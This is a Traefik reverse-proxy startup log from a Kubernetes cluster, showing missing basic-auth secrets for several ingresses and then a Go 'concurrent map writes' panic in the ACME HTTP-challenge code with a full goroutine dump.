time="2018-07-09t12:03:08z" level=info msg="\ stats collection is disabled.\ help us improve traefik by turning this feature on :)\ more details on: #collected-data\ "
time="2018-07-09t12:03:08z" level=info msg="preparing server http &{address::80 tls:<nil> redirect: auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-07-09t12:03:08z" level=info msg="preparing server https &{address::443 tls: redirect:<nil> auth:<nil> whitelistsourcerange:[] whitelist:<nil> compress:true proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-07-09t12:03:08z" level=info msg="starting server on :80"
time="2018-07-09t12:03:09z" level=info msg="preparing server traefik &{address::8080 tls:<nil> redirect:<nil> auth: whitelistsourcerange:[] whitelist:<nil> compress:false proxyprotocol:<nil> forwardedheaders: } with readtimeout=0s writetimeout=0s idletimeout=3m0s"
time="2018-07-09t12:03:09z" level=info msg="starting server on :443"
time="2018-07-09t12:03:09z" level=info msg="starting provider configuration.provideraggregator {}"
time="2018-07-09t12:03:09z" level=info msg="starting server on :8080"
time="2018-07-09t12:03:09z" level=info msg="starting provider *kubernetes.provider {\\"watch\\":true,\\"filename\\":\\"\\",\\"constraints\\":[],\\"trace\\":false,\\"templateversion\\":0,\\"debugloggeneratedtemplate\\":false,\\"endpoint\\":\\"\\",\\"token\\":\\"\\",\\"certauthfilepath\\":\\"\\",\\"disablepasshostheaders\\":false,\\"enablepasstlscert\\":false,\\"namespaces\\":null,\\"labelselector\\":\\"\\",\\"ingressclass\\":\\"\\"}"
time="2018-07-09t12:03:09z" level=info msg="starting provider *acme.provider {\\"email\\":\\"my@em.ail\\",\\"acmelogging\\":false,\\"caserver\\":\\" ",\\"storage\\":\\"/acme/acme.json\\",\\"entrypoint\\":\\"https\\",\\"onhostrule\\":true,\\"ondemand\\":false,\\"dnschallenge\\":null,\\"httpchallenge\\":{\\"entrypoint\\":\\"http\\"},\\"domains\\":null,\\"store\\":{}}"
time="2018-07-09t12:03:09z" level=info msg="ingress label selector is: \\"\\""
time="2018-07-09t12:03:09z" level=info msg="creating in-cluster provider client"
time="2018-07-09t12:03:09z" level=info msg="testing certificate renew..."
time="2018-07-09t12:03:09z" level=info msg="server configuration reloaded on :443"
time="2018-07-09t12:03:09z" level=info msg="server configuration reloaded on :8080"
time="2018-07-09t12:03:09z" level=info msg="server configuration reloaded on :80"
time="2018-07-09t12:03:10z" level=error msg="failed to retrieve basic auth configuration for ingress weave/weave-scope-app: failed to load auth credentials: secret \\"weave\\"/\\"weave-scope-auth\\" not found"
time="2018-07-09t12:03:10z" level=error msg="failed to retrieve basic auth configuration for ingress logging/kibana: failed to load auth credentials: secret \\"logging\\"/\\"kibana-auth\\" not found"
time="2018-07-09t12:03:10z" level=error msg="failed to retrieve basic auth configuration for ingress metrics/metric-influxdb-influxdb: failed to load auth credentials: secret \\"metrics\\"/\\"influxdb-auth\\" not found"
time="2018-07-09t12:03:10z" level=error msg="failed to retrieve basic auth configuration for ingress logging/elasticsearch: failed to load auth credentials: secret \\"logging\\"/\\"elasticsearch-auth\\" not found"
time="2018-07-09t12:03:10z" level=info msg="server configuration reloaded on :443"
time="2018-07-09t12:03:10z" level=info msg="server configuration reloaded on :8080"
time="2018-07-09t12:03:10z" level=info msg="server configuration reloaded on :80"
time="2018-07-09t12:03:12z" level=info msg="server configuration reloaded on :8080"
time="2018-07-09t12:03:12z" level=info msg="server configuration reloaded on :80"
time="2018-07-09t12:03:12z" level=info msg="server configuration reloaded on :443"
time="2018-07-09t12:03:18z" level=info msg="server configuration reloaded on :80"
time="2018-07-09t12:03:18z" level=info msg="server configuration reloaded on :443"
time="2018-07-09t12:03:18z" level=info msg="server configuration reloaded on :8080"
time="2018-07-09t12:04:17z" level=info msg=register...
fatal error: concurrent map writes goroutine 105 [running]:
runtime.throw( , ) /usr/local/go/src/runtime/panic.go:616 + fp= sp= pc=
runtime.mapassign_faststr( , , , , ) /usr/local/go/src/runtime/hashmap_fast.go:703 + fp= sp= pc=
github.com/containous/traefik/provider/acme.presenthttpchallenge( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/challenge.go:73 + fp= sp= pc=
github.com/containous/traefik/provider/acme.(*provider).present( , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:331 + fp= sp= pc=
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*httpchallenge).solve( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/http_challenge.go:30 + fp= sp= pc=
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).solvechallengeforauthz( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:543 + fp= sp= pc=
github.com/containous/traefik/vendor/github.com/xenolf/lego/acme.(*client).obtaincertificate( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/vendor/github.com/xenolf/lego/acme/client.go:398 + fp= sp= pc=
github.com/containous/traefik/provider/acme.(*provider).resolvecertificate( , , , , , , , , , ) /go/src/github.com/containous/traefik/provider/acme/provider.go:237 + fp= sp= pc=
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1.1() /go/src/github.com/containous/traefik/provider/acme/provider.go:193 + fp= sp= pc=
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 + fp= sp= pc=
runtime.goexit() /usr/local/go/src/runtime/asm_amd64.s:2361 + fp= sp= pc=
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 1 [chan receive, 1 minutes]:
github.com/containous/traefik/server.(*server).wait(...) /go/src/github.com/containous/traefik/server/server.go:232
main.runcmd( , , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:216 +
main.main.func1( , ) /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:54 +
github.com/containous/traefik/vendor/github.com/containous/staert.(*staert).run( , , ) /go/src/github.com/containous/traefik/vendor/github.com/containous/staert/staert.go:84 +
main.main() /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:142 + goroutine 21 [syscall, 1 minutes]:
os/signal.signal_recv( ) /usr/local/go/src/runtime/sigqueue.go:139 +
os/signal.loop() /usr/local/go/src/os/signal/signal_unix.go:22 +
created by os/signal.init.0 /usr/local/go/src/os/signal/signal_unix.go:28 + goroutine 9 [chan receive]:
github.com/containous/traefik/vendor/github.com/golang/glog.(*loggingt).flushdaemon( ) /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:879 +
created by github.com/containous/traefik/vendor/github.com/golang/glog.init.0 /go/src/github.com/containous/traefik/vendor/github.com/golang/glog/glog.go:410 + goroutine 22 [select]:
io.(*pipe).read( , , , , , , ) /usr/local/go/src/io/pipe.go:50 +
io.(*pipereader).read( , , , , , , ) /usr/local/go/src/io/pipe.go:127 +
bufio.(*scanner).scan( , ) /usr/local/go/src/bufio/scan.go:208 +
github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerscanner( , , ) /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:51 +
created by github.com/containous/traefik/vendor/github.com/sirupsen/logrus.(*entry).writerlevel /go/src/github.com/containous/traefik/vendor/github.com/sirupsen/logrus/writer.go:43 + goroutine 24 [sleep, 1 minutes]:
time.sleep( ) /usr/local/go/src/runtime/time.go:102 +
main.checknewversion.func1() /go/src/github.com/containous/traefik/cmd/traefik/traefik.go:283 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 25 [chan receive]:
github.com/containous/traefik/provider/acme.(*localstore).listensaveaction.func1() /go/src/github.com/containous/traefik/provider/acme/local_store.go:92 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 26 [chan receive, 1 minutes]:
github.com/containous/traefik/provider/acme.(*localstore).listensaveaction.func1() /go/src/github.com/containous/traefik/provider/acme/local_store.go:92 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 27 [select, 1 minutes, locked to thread]:
runtime.gopark( , , , , , ) /usr/local/go/src/runtime/proc.go:291 +
runtime.selectgo( , ) /usr/local/go/src/runtime/select.go:392 +
runtime.ensuresigm.func1() /usr/local/go/src/runtime/signal_unix.go:549 +
runtime.goexit() /usr/local/go/src/runtime/asm_amd64.s:2361 + goroutine 35 [chan receive, 1 minutes]:
github.com/containous/traefik/cmd.contextwithsignal.func1( , ) /go/src/github.com/containous/traefik/cmd/context.go:17 +
created by github.com/containous/traefik/cmd.contextwithsignal /go/src/github.com/containous/traefik/cmd/context.go:15 + goroutine 50 [chan receive, 1 minutes]:
github.com/containous/traefik/server.(*server).startwithcontext.func1( , , ) /go/src/github.com/containous/traefik/server/server.go:214 +
created by github.com/containous/traefik/server.(*server).startwithcontext /go/src/github.com/containous/traefik/server/server.go:212 + goroutine 51 [sleep]:
time.sleep( ) /usr/local/go/src/runtime/time.go:102 +
github.com/containous/traefik/vendor/github.com/thoas/stats.new.func1( ) /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:35 +
created by github.com/containous/traefik/vendor/github.com/thoas/stats.new /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:31 + goroutine 36 [runnable]:
runtime.setfinalizer( , , , ) /usr/local/go/src/runtime/mfinal.go:415 +
net.(*netfd).setaddr( , , , , ) /usr/local/go/src/net/fd_unix.go:52 +
net.(*netfd).accept( , , , ) /usr/local/go/src/net/fd_unix.go:255 +
net.(*tcplistener).accept( , , , ) /usr/local/go/src/net/tcpsock_posix.go:136 +
net.(*tcplistener).accept( , , , , ) /usr/local/go/src/net/tcpsock.go:259 +
net/http.(*server).serve( , , , , ) /usr/local/go/src/net/http/server.go:2770 +
github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/server/server.go:735 +
created by github.com/containous/traefik/server.(*server).starthttpservers /go/src/github.com/containous/traefik/server/server.go:302 + goroutine 37 [io wait]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).accept( , , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:372 +
net.(*netfd).accept( , , , ) /usr/local/go/src/net/fd_unix.go:238 +
net.(*tcplistener).accept( , , , ) /usr/local/go/src/net/tcpsock_posix.go:136 +
net.(*tcplistener).accept( , , , , ) /usr/local/go/src/net/tcpsock.go:259 +
crypto/tls.(*listener).accept( , , , , ) /usr/local/go/src/crypto/tls/tls.go:52 +
net/http.(*server).serve( , , , , ) /usr/local/go/src/net/http/server.go:2770 +
net/http.(*server).servetls( , , , , , , , , ) /usr/local/go/src/net/http/server.go:2839 +
github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/server/server.go:733 +
created by github.com/containous/traefik/server.(*server).starthttpservers /go/src/github.com/containous/traefik/server/server.go:302 + goroutine 38 [io wait, 1 minutes]:
internal/poll.runtime_pollwait( , , ) /usr/local/go/src/runtime/netpoll.go:173 +
internal/poll.(*polldesc).wait( , , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
internal/poll.(*polldesc).waitread( , , , ) /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
internal/poll.(*fd).accept( , , , , , , , ) /usr/local/go/src/internal/poll/fd_unix.go:372 +
net.(*netfd).accept( , , , ) /usr/local/go/src/net/fd_unix.go:238 +
net.(*tcplistener).accept( , , , ) /usr/local/go/src/net/tcpsock_posix.go:136 +
net.(*tcplistener).accept( , , , , ) /usr/local/go/src/net/tcpsock.go:259 +
net/http.(*server).serve( , , , , ) /usr/local/go/src/net/http/server.go:2770 +
github.com/containous/traefik/server.(*server).startserver( , , , , , , , , , , ...) /go/src/github.com/containous/traefik/server/server.go:735 +
created by github.com/containous/traefik/server.(*server).starthttpservers /go/src/github.com/containous/traefik/server/server.go:302 + goroutine 39 [select, 1 minutes]:
github.com/containous/traefik/server.(*server).listenproviders( , ) /go/src/github.com/containous/traefik/server/server.go:370 +
github.com/containous/traefik/server.(*server).start.func1( ) /go/src/github.com/containous/traefik/server/server.go:201 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 40 [select, 1 minutes]:
github.com/containous/traefik/server.(*server).listenconfigurations( , ) /go/src/github.com/containous/traefik/server/server.go:445 +
github.com/containous/traefik/server.(*server).start.func2( ) /go/src/github.com/containous/traefik/server/server.go:204 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 45 [select, 1 minutes]:
github.com/containous/traefik/provider/acme.(*provider).watchcertificate.func1( ) /go/src/github.com/containous/traefik/provider/acme/provider.go:387 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 42 [chan receive, 1 minutes]:
github.com/containous/traefik/server.(*server).listensignals( ) /go/src/github.com/containous/traefik/server/server_signals.go:18 +
created by github.com/containous/traefik/server.(*server).start /go/src/github.com/containous/traefik/server/server.go:207 + goroutine 11 [semacquire, 1 minutes]:
sync.runtime_notifylistwait( , ) /usr/local/go/src/runtime/sema.go:510 +
sync.(*cond).wait( ) /usr/local/go/src/sync/cond.go:56 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*deltafifo).pop( , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/delta_fifo.go:438 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).processloop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:150 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.processloop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:124 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:124 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedindexinformer).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:226 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/informers.(*sharedinformerfactory).start /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/informers/factory.go:86 + goroutine 48 [select, 1 minutes]:
github.com/containous/traefik/server.(*server).throttleproviderconfigreload( , , , , ) /go/src/github.com/containous/traefik/server/server.go:426 +
github.com/containous/traefik/server.(*server).preloadconfiguration.func1( ) /go/src/github.com/containous/traefik/server/server.go:398 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 46 [select, 1 minutes]:
github.com/containous/traefik/provider/acme.(*provider).watchnewdomains.func1( ) /go/src/github.com/containous/traefik/provider/acme/provider.go:167 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 47 [select, 1 minutes]:
github.com/containous/traefik/provider/acme.(*provider).provide.func2( ) /go/src/github.com/containous/traefik/provider/acme/provider.go:366 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 65 [select, 1 minutes]:
github.com/containous/traefik/vendor/github.com/eapache/channels.(*ringchannel).ringbuffer( ) /go/src/github.com/containous/traefik/vendor/github.com/eapache/channels/ring_channel.go:87 +
created by github.com/containous/traefik/vendor/github.com/eapache/channels.newringchannel /go/src/github.com/containous/traefik/vendor/github.com/eapache/channels/ring_channel.go:32 + goroutine 66 [select, 1 minutes]:
github.com/containous/traefik/server.(*server).throttleproviderconfigreload.func1( ) /go/src/github.com/containous/traefik/server/server.go:415 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 10 [runnable]:
reflect.valueof( , , , , ) /usr/local/go/src/reflect/value.go:2150 +
reflect.deepequal( , , , , ) /usr/local/go/src/reflect/deepequal.go:192 +
github.com/containous/traefik/provider/kubernetes.(*provider).provide.func1.1( , ) /go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:134 +
github.com/containous/traefik/safe.operationwithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:160 +
github.com/containous/traefik/vendor/github.com/cenk/backoff.retrynotify( , , , , , ) /go/src/github.com/containous/traefik/vendor/github.com/cenk/backoff/retry.go:37 +
github.com/containous/traefik/provider/kubernetes.(*provider).provide.func1( ) /go/src/github.com/containous/traefik/provider/kubernetes/kubernetes.go:151 +
github.com/containous/traefik/safe.(*pool).go.func1() /go/src/github.com/containous/traefik/safe/routine.go:78 +
github.com/containous/traefik/safe.gowithrecover.func1( , ) /go/src/github.com/containous/traefik/safe/routine.go:142 +
created by github.com/containous/traefik/safe.gowithrecover /go/src/github.com/containous/traefik/safe/routine.go:136 + goroutine 12 [semacquire, 1 minutes]:
sync.runtime_notifylistwait( , ) /usr/local/go/src/runtime/sema.go:510 +
sync.(*cond).wait( ) /usr/local/go/src/sync/cond.go:56 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*deltafifo).pop( , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/delta_fifo.go:438 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).processloop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:150 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.processloop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:124 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:124 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedindexinformer).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:226 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/informers.(*sharedinformerfactory).start /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/informers/factory.go:86 + goroutine 13 [semacquire]:
sync.runtime_notifylistwait( , ) /usr/local/go/src/runtime/sema.go:510 +
sync.(*cond).wait( ) /usr/local/go/src/sync/cond.go:56 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*deltafifo).pop( , , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/delta_fifo.go:438 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).processloop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:150 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.processloop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:124 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil.func1( ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:133 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.jitteruntil( , , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:134 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.until( , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:88 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:124 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedindexinformer).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:226 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/informers.(*sharedinformerfactory).start /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/informers/factory.go:86 + goroutine 14 [runnable]:
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.poller.func1.1( , , , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:354 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.poller.func1 /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:337 + goroutine 15 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).run( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:545 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.run)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:387 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 68 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedprocessor).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:427 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedprocessor).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.run)-fm( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:219 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).startwithchannel.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:54 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 29 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedprocessor).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:427 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedprocessor).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.run)-fm( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:219 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).startwithchannel.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:54 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 53 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedprocessor).run( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:427 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*sharedprocessor).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.run)-fm( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:219 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).startwithchannel.func1() /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:54 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 54 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:103 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102 + goroutine 69 [chan receive, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:103 +
created by github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*controller).run /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/controller.go:102 + goroutine 16 [select, 1 minutes]:
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).pop( ) /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:519 +
github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.(*processorlistener).(github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache.pop)-fm() /go/src/github.com/containous/traefik/vendor/k8s.io/client-go/tools/cache/shared_informer.go:388 +
github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start.func1( , ) /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:71 +
created by github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait.(*group).start /go/src/github.com/containous/traefik/vendor/k8s.io/apimachinery/pkg/util/wait/wait.go:69 + goroutine 30 [chan receive, 1 minutes]:
